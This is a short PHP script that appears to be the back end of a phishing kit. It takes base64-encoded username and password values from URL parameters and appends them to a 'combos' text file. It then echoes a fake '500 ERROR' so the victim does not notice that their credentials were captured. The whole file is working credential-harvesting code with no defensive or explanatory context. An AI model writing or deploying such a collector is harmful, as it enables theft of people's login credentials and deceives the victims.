<?php
	$u = base64_decode(urldecode($_GET['u']));
	$p = base64_decode(urldecode($_GET['p']));
	$myfile = fopen("IDKspatk/combos[//RANDOM//].txt", "a") or die("50 ERROR");
	fwrite($myfile, "\n". $u.' : '.$p);
	fclose($myfile);
	echo 500 ERROR;
?>
